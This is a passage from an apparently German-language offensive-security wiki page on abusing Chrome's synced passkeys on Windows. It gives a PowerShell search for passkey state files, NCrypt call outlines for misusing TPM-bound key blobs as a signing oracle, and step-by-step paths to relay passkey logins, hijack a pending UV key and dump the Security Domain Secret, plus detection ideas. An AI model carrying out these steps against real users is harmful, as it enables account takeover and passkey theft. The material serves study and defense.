  Where-Object { $_.FullName -match 'passkey_enclave_state|Sync Data\\LevelDB' } |
  Select-Object FullName, Length, LastWriteTime
```

### TPM-gebundene Key-Blobs können weiterhin als lokale Signing-Oracle missbraucht werden

Wenn der Browser einen TPM-gestützten Identitätsschlüssel als **`NCRYPT_OPAQUE_KEY_BLOB`** exportiert und diesen Blob in einem benutzerzugänglichen Zustand speichert, muss Malware **nicht** den rohen privaten Schlüssel extrahieren. Sie kann den Blob einfach auf derselben **Maschine** erneut importieren und das lokale TPM auffordern, angreifergesteuerte Daten zu signieren:<sup>[[4]](#references)[[6]](#references)</sup>

```c
NCryptOpenStorageProvider(...)
NCryptImportKey(..., NCRYPT_OPAQUE_KEY_BLOB, ...)
NCryptSignHash(...)
```

Dies bedeutet: **Hardwarebindung verhindert den Export außerhalb des Geräts, aber nicht die Nutzung durch denselben Benutzer auf dem kompromittierten Endpunkt**.

### Praktische Missbrauchswege

1. **Pass-ta-key / Weiterleitung der Geräteidentität**<sup>[[4]](#references)</sup>
   - `WebauthnCredentialSpecifics` aus Chromes LevelDB auflisten.
   - Einen Passkey-Login starten und eine neue WebAuthn-Challenge abrufen.
   - Den gestohlenen `wrapped_identity_private_key`-Blob auf dem TPM des Opfers verwenden, um die Bindung der Cloud-Authentifizierungsanfrage zu signieren.
   - Die erhaltene Assertion an die relying party weiterleiten.
   - Das ist besonders nützlich, wenn die RP `userVerification=preferred` akzeptiert oder Assertions mit **`UV=0`** nicht zurückweist.
2. **Hijacking eines ausstehenden UV-Schlüssels**<sup>[[4]](#references)</sup>
   - Ein erneutes Onboarding erzwingen, indem `passkey_enclave_state` gelöscht oder eine gültige signierte `device/forget`-Operation gesendet wird.
   - Wenn das Onboarding das Gerät im Zustand **`uv_key_pending`** belässt, einen vom Angreifer kontrollierten öffentlichen UV-Schlüssel registrieren.
   - Wenn der Anbieter die Attestierung / den Ursprung aus sicherer Hardware für den neuen UV-Schlüssel nicht überprüft, werden spätere Signaturen des Angreiferschlüssels als **`UV=1`** behandelt.
3. **Diebstahl des Master Secrets / der SDS-Wiederherstellung**<sup>[[4]](#references)</sup>
   - Eine Wiederherstellung oder erneute Verknüpfung erzwingen, damit Chrome das synchronisierte Passkey-Master-Secret abruft.
   - Die Neuerstellung/Änderung von `passkey_enclave_state` überwachen und dann den Chrome-Speicher auslesen, während das Klartext-**Security Domain Secret (SDS)** im Speicher liegt.
   - Mit der wiederhergestellten SDS die verschlüsselten Felder in allen `WebauthnCredentialSpecifics`-Einträgen entschlüsseln und portable WebAuthn-Private-Keys wiederherstellen.

### DFIR- / Erkennungsideen

- **Löschen/Neuerstellen** von `passkey_enclave_state` überwachen.<sup>[[4]](#references)</sup>
- Ungewöhnlichen Zugriff auf Chromes **`Sync Data\LevelDB`** durch Nicht-Browser-Prozesse melden.
- **Chrome-Speicherdumps** oder verdächtigen prozessübergreifenden Speicherzugriff melden.
- Wiederholte Aufforderungen zur **Google Password Manager-Wiederherstellungs-PIN** oder unerwartetes erneutes Onboarding untersuchen.
- Beachten, dass der WebAuthn-**`signCount`** bei synchronisierten Passkeys oft nicht hilfreich ist, da er konstant bleiben kann. Daher ist die klassische Klonerkennung schwach.

## References

- [1] [Unit 42 – Eine Untersuchung jahrelang unentdeckter Operationen gegen hochwertige Sektoren](https://unit42.paloaltonetworks.com/cl-unk-1068-targets-critical-sectors/)
- [2] [0xdf – HTB/VulnLab JobTwo: Phishing mit Word-VBA-Makro über SMTP → Entschlüsselung von hMailServer-Anmeldedaten → Veeam CVE-2023-27532 zu SYSTEM](https://0xdf.gitlab.io/2026/01/27/htb-jobtwo.html)
- [3] [Check Point Research – Ink Dragon im Detail: Das Relay-Netzwerk und die internen Abläufe einer verdeckten offensiven Operation enthüllt](https://research.checkpoint.com/2025/ink-dragons-relay-network-and-offensive-operation/)
- [4] [Unit 42 – Pass the Passkey: Eine neuartige Angriffsfläche bei passwortloser Authentifizierung](https://unit42.paloaltonetworks.com/passwordless-authentication-security-risks/)
- [5] [Chromium – `webauthn_credential_specifics.proto`](https://chromium.googlesource.com/chromium/src/+/main/components/sync/protocol/webauthn_credential_specifics.proto)
- [6] [Microsoft – `NCryptCreatePersistedKey` / CNG-Schlüsselspeicher](https://learn.microsoft.com/en-us/windows/win32/api/ncrypt/nf-ncrypt-ncryptcreatepersistedkey)
- [7] [0xWord – Windows-Hacking: Angriffe auf Microsoft-Systeme und -Netzwerke](https://0xword.com/es/libros/99-hacking-windows-ataques-a-sistemas-y-redes-microsoft.html)
- [8] [So funktioniert der Active Directory-Datenspeicher wirklich: Einblick in NTDS.dit (Teil 1)](https://blog.chrisse.se/?p=762)
- [9] [en.hackndo.com – Remote-Dump von Lsass-Kennwörtern](https://en.hackndo.com/remote-lsass-dump-passwords)
- [10] [Kaspersky Securelist – Armored Likho erweitert sein Cyber-Spionage-Arsenal um das Still-Toolkit](https://securelist.com/armored-likho-still-toolkit/121033)
- [11] [Microsoft Learn – CreateFileW-Funktion und `FILE_FLAG_BACKUP_SEMANTICS`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilew)
- [12] [Microsoft Learn – Robocopy-Backupmodus `/B`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy)
- [13] [Telegram-FAQ – aktive Sitzungen beenden](https://telegram.org/faq)
{{#include ../../banners/hacktricks-training.md}}
